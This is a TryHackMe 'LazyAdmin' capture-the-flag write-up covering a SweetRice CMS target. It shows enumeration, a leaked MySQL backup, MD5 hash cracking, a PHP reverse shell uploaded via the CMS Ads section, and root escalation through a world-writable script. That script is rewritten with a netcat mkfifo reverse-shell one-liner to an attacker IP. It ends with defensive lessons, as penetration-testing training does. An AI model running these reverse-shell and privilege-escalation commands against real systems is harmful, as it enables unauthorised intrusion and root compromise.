# LazyAdmin — TryHackMe Writeup

**Room:** https://tryhackme.com/room/lazyadmin
**Difficulty:** Easy
**Category:** CMS Enumeration · Backup File Disclosure · MD5 Cracking · PHP Reverse Shell · Sudo Perl Privesc

> *"Easy linux machine to practice your skills"*

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.10.93.93

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Standard pair: SSH and HTTP. The web root shows the default Apache page — nothing interesting there yet.

---

## 2. Web Enumeration — Layer 1

```bash
gobuster dir -u http://10.10.93.93 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -o gobuster1.log
```

```
/content    (Status: 301)
```

Navigating to `/content` shows a **SweetRice CMS** installation page. SweetRice is the target — time to enumerate its structure.

### Gobuster — Layer 2 Inside `/content`

```bash
gobuster dir -u http://10.10.93.93/content \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,sql -o gobuster2.log
```

```
/inc         (Status: 301)
/as          (Status: 301)
/images      (Status: 301)
/js          (Status: 301)
/attachment  (Status: 301)
```

`/as` — the SweetRice admin login panel.
`/inc` — a directory with open listing. Inside is a folder named `mysql_backup`.

---

## 3. MySQL Backup File — Credentials Leak

Navigating to `/content/inc/mysql_backup/` reveals a downloadable SQL backup file:

```
mysql_bakup_20191129023059-1.5.1.sql
```

Download and search for credentials:

```bash
grep -i "admin\|password\|user" mysql_bakup_20191129023059-1.5.1.sql | head -20
```

At line 79, an INSERT statement contains the admin credentials:

```sql
INSERT INTO `%--%_options` VALUES('1','admin_user','manager');
INSERT INTO `%--%_options` VALUES('2','admin_password','42f749ade7f9e195bf475f37a44cafcb');
```

- **Username:** `manager`
- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)

---

## 4. Cracking the MD5 Hash

Use hashcat with the rockyou wordlist:

```bash
hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
```

```
42f749ade7f9e195bf475f37a44cafcb:Password123
```

Or instantly via CrackStation — the hash is in its database.

**Credentials:**
- **Username:** `manager`
- **Password:** `Password123`

---

## 5. SweetRice Admin Panel Login

Navigate to `http://10.10.93.93/content/as/` and log in with `manager:Password123`. The SweetRice 1.5.1 dashboard loads.

### Checking Exploit-DB

```bash
searchsploit sweetrice
```

```
SweetRice 1.5.1 - Backup Disclosure                           | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                  | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Exec  | php/webapps/40700.html
SweetRice < 1.5.1 - Arbitrary File Upload                     | php/webapps/23686.txt
SweetRice < 1.5.1 - Change Admin Password (Unauthenticated)   | php/webapps/26879.txt
```

The **PHP Code Execution via Ads section** (40700) is the relevant one — now that we have admin access.

---

## 6. Getting a Reverse Shell — PHP via Ads Section

In the SweetRice dashboard, navigate to **Ads** in the left menu. Create a new ad and paste a PHP reverse shell (PentestMonkey's `/usr/share/webshells/php/php-reverse-shell.php`). Update the IP and port, save as `shell.php`.

Start the listener:

```bash
nc -lnvp 4444
```

Trigger the shell by visiting:

```
http://10.10.93.93/content/inc/ads/shell.php
```

```
connect to [YOUR_IP] from lazyadmin.thm [10.10.93.93] 49682
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu
www-data@THM-Chal:/var/www/html/content/inc/ads$
```

Grab the user flag:

```bash
www-data@THM-Chal:/home/itguy$ cat user.txt
```

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 7. Privilege Escalation — sudo perl → copy.sh

Check sudo permissions:

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Read the Perl script:

```bash
www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

It calls `/etc/copy.sh`. Check that script:

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

`/etc/copy.sh` is **world-writable**:

```bash
www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh
```

The file already contains a reverse shell — just update the IP and port to point back to our machine:

```bash
www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 5554 >/tmp/f" > /etc/copy.sh
```

Start a second listener on port 5554:

```bash
nc -lnvp 5554
```

Trigger it:

```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
```

```
connect to [YOUR_IP] from lazyadmin.thm [10.10.93.93]
# whoami
root
```

Root shell. Grab the flag:

```bash
# cat /root/root.txt
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Key Learnings

- **CMS backup files in `/inc/` are a default SweetRice disclosure** — SweetRice stores MySQL backups under `/content/inc/mysql_backup/` by default with no access control. Any authenticated or unauthenticated visitor can download them. Always enumerate CMS subdirectories, not just the CMS root.
- **MD5 password hashes are trivially crackable** — `Password123` appeared in CrackStation instantly. MD5 without salting provides no real protection for common passwords. Developers who store MD5 hashes in SQL backups and leave those backups accessible have compounded two mistakes into one.
- **The SweetRice Ads section allows raw PHP execution** — any CMS feature that stores and serves user-submitted content as PHP is effectively a file upload RCE vector. Once admin access is obtained, checking every content-editing feature for PHP execution capability is standard practice.
- **`sudo perl script.pl` where `script.pl` calls a writable file = instant root** — the chain here is: `sudo perl` → `backup.pl` → `copy.sh`. We can't edit `backup.pl` (it's in itguy's home and owned by root), but `copy.sh` is world-writable. Modifying the second-order dependency achieves the same outcome.
- **World-writable files in `/etc/` are critical findings** — any file in `/etc/` writable by `others` is a misconfiguration worth immediate attention. `/etc/copy.sh` with permissions `o+w` is effectively a root shell waiting to be claimed.

## Conclusion

LazyAdmin demonstrates why defence-in-depth matters: a single exposed backup file creates a credential leak, which grants CMS admin access, which allows PHP execution, which yields a shell. The privilege escalation then exploits a two-level chain — sudo Perl calls a world-writable shell script — which is textbook indirect escalation. Every individual weakness here is preventable: restrict backup file paths, salt your hashes, disable PHP in ad sections, audit sudo entries, and audit world-writable files in `/etc/`. Together they form a complete easy-to-root chain.
